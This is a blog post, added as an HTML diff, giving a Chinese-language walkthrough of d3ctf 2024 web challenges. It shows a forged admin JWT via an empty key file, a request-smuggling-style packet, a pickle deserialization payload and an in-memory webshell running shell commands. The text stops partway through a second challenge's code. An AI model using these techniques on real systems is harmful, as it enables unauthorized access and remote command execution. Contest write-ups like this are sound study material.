@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>d3ctf-2024-web-wp | zoiltin&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="d^3ctf 2024 web方向wp">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/d3ctf-2024-web-wp/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" integrity="sha256-1yREUm1&#43;y9sAFUOKf6iQVKZYv3WdBULi5d&#43;BzpS0k&#43;4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/d3ctf-2024-web-wp/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      d3ctf-2024-web-wp
+    </h1>
+    <div class="post-description">
+      d^3ctf 2024 web方向wp
+    </div>
+    <div class="post-meta"><span title='2024-04-28 20:35:50 +0000 UTC'>April 28, 2024</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="d3pythonhttp">d3pythonhttp<a hidden class="anchor" aria-hidden="true" href="#d3pythonhttp">#</a></h1>
+<blockquote>
+<p>解决，一血</p>
+</blockquote>
+<h2 id="jwt绕过">jwt绕过<a hidden class="anchor" aria-hidden="true" href="#jwt绕过">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_key</span>(kid):
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/app/&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(dir<span style="color:#f92672">+</span>kid, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            key <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    print(key)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> key
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_token</span>(token):
+</span></span><span style="display:flex;"><span>    header <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>get_unverified_header(token)
+</span></span><span style="display:flex;"><span>    kid <span style="color:#f92672">=</span> header[<span style="color:#e6db74">&#34;kid&#34;</span>]
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> get_key(kid)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, key, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;HS256&#34;</span>])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span></code></pre></div><p>验证jwt时kid控制密钥文件路径，如果设置的密钥文件不存在，则key为空，所以构造空秘钥以及一个不存在的文件即可：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(jwt<span style="color:#f92672">.</span>encode({<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;isadmin&#34;</span>:true}, key, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;frontend_keyasdasd&#34;</span>}))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M</span>
+</span></span></code></pre></div><h2 id="解析差异">解析差异<a hidden class="anchor" aria-hidden="true" href="#解析差异">#</a></h2>
+<p>一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。              <br>
+经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {key: value <span style="color:#66d9ef">for</span> (key, value) <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>headers <span style="color:#66d9ef">if</span> key <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;Host&#39;</span>}
+</span></span></code></pre></div><p>除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。
+数据包：</p>
+<pre tabindex="0"><code>POST /admin HTTP/1.1
+Host: 192.168.72.137:8081
+Content-Length: 192
+Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M
+Transfer-Encoding: chunKed
+
+dc
+&lt;base64payload...长度为192&gt;BackdoorPasswordOnlyForAdmin
+0
+</code></pre><p>后端只读取前192个字符，后面的BackdoorPasswordOnlyForAdmin被舍弃。绕过。          <br>
+base64解码后pickle反序列化。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print(1)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">test</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (exec,(payload,))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> test()
+</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(pickle<span style="color:#f92672">.</span>dumps(a))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(b)
+</span></span></code></pre></div><h2 id="突破内网">突破内网<a hidden class="anchor" aria-hidden="true" href="#突破内网">#</a></h2>
+<p>题目不出网，可以试试整个类似内存马的东西（从dubhe ctf 2024中学到的）。                   <br>
+后端存在以下路由：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>urls <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;index&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;/backdoor&#39;</span>, <span style="color:#e6db74">&#39;backdoor&#39;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>web<span style="color:#f92672">.</span>config<span style="color:#f92672">.</span>debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>application(urls, globals())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">index</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;welcome to the backend!&#34;</span>
+</span></span></code></pre></div><p>对应前端代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/backend&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proxy_to_backend</span>():
+</span></span><span style="display:flex;"><span>    forward_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;python-backend:8080&#34;</span>
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> http<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>HTTPConnection(forward_url)
+</span></span><span style="display:flex;"><span>    method <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>method
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {key: value <span style="color:#66d9ef">for</span> (key, value) <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>headers <span style="color:#66d9ef">if</span> key <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;Host&#34;</span>}
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>data
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>query_string:
+</span></span><span style="display:flex;"><span>        path <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;?&#34;</span> <span style="color:#f92672">+</span> request<span style="color:#f92672">.</span>query_string<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>request(method, path, body<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>getresponse()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response<span style="color:#f92672">.</span>read()
+</span></span></code></pre></div><pre tabindex="0"><code>response = conn.getresponse()
+</code></pre><p>这段代码意味着后端处理的数据后会回显到前端，而/backdoor路由不会，所以我们可以将后端index路由覆盖为内存马。            <br>
+使用exec函数执行以下python代码就可以将index路由的GET方法覆盖(asd参数要保留，因为服务器调用的时候会传一个self参数)：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>(asd):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;pwned&#34;</span>
+</span></span><span style="display:flex;"><span>index<span style="color:#f92672">.</span>GET <span style="color:#f92672">=</span> test
+</span></span></code></pre></div><p><img loading="lazy" src="../../images/bd10f053cb90c805.png">
+访问index路由是可以带get参数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>query_string:
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;?&#34;</span> <span style="color:#f92672">+</span> request<span style="color:#f92672">.</span>query_string<span style="color:#f92672">.</span>decode()
+</span></span></code></pre></div><p>所以内存马实现如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>(asd):
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>input()<span style="color:#f92672">.</span>cmd
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> __import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(cmd)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>index<span style="color:#f92672">.</span>GET <span style="color:#f92672">=</span> test
+</span></span></code></pre></div><p><img loading="lazy" src="../../images/ac5b1bd227fc3c04.png"></p>
+<h1 id="stack_overflow">stack_overflow<a hidden class="anchor" aria-hidden="true" href="#stack_overflow">#</a></h1>
+<blockquote>
+<p>解决，一血</p>
+</blockquote>
+<p>题目用nodejs模拟了一个栈溢出。
+关键代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">respond</span> <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stack</span> <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">getStack</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">address</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">address</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">pie</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">address</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">pie</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10000</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">stack</span>[<span style="color:#a6e22e">address</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">pie</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">getIndex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">address</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">address</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">pie</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">read</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">fd</span>, <span style="color:#a6e22e">buf</span>, <span style="color:#a6e22e">count</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">ori</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>[<span style="color:#a6e22e">fd</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ori</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">count</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">count</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ori</span>.<span style="color:#a6e22e">length</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">ori</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;string&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Array.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">ori</span>)) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#34;err&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;hack!&#34;</span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">count</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">waf</span>(<span style="color:#a6e22e">ori</span>[<span style="color:#a6e22e">i</span>])) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#34;err&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;hack!&#34;</span>})
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">stack</span>[<span style="color:#a6e22e">getIndex</span>(<span style="color:#a6e22e">buf</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ori</span>[<span style="color:#a6e22e">i</span>]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">write</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">fd</span>, <span style="color:#a6e22e">buf</span>, <span style="color:#a6e22e">count</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">respond</span>.<span style="color:#a6e22e">hasOwnProperty</span>(<span style="color:#a6e22e">fd</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">respond</span>[<span style="color:#a6e22e">fd</span>] <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">count</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">respond</span>[<span style="color:#a6e22e">fd</span>].<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">getStack</span>(<span style="color:#a6e22e">buf</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">i</span>))   
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">run</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">address</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">continuing</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">continuing</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">getStack</span>(<span style="color:#a6e22e">address</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;read&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">r_fd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">read_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">read_addr</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;{{&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">read_addr</span>.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">&#34;}}&#34;</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">read_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pie</span> <span style="color:#f92672">+</span> eval(<span style="color:#a6e22e">read_addr</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">2</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;stack&#34;</span>, (<span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>).<span style="color:#a6e22e">toString</span>()))
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">r_fd</span>, parseInt(<span style="color:#a6e22e">read_addr</span>), parseInt(<span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>()))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;write&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">w_fd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">write_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write_addr</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;{{&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">write_addr</span>.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">&#34;}}&#34;</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">write_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pie</span> <span style="color:#f92672">+</span> eval(<span style="color:#a6e22e">write_addr</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">2</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;stack&#34;</span>, (<span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>).<span style="color:#a6e22e">toString</span>()))
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">w_fd</span>, parseInt(<span style="color:#a6e22e">write_addr</span>), parseInt(<span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>()))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;exit&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">continuing</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;call_interface&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">numOfArgs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>()
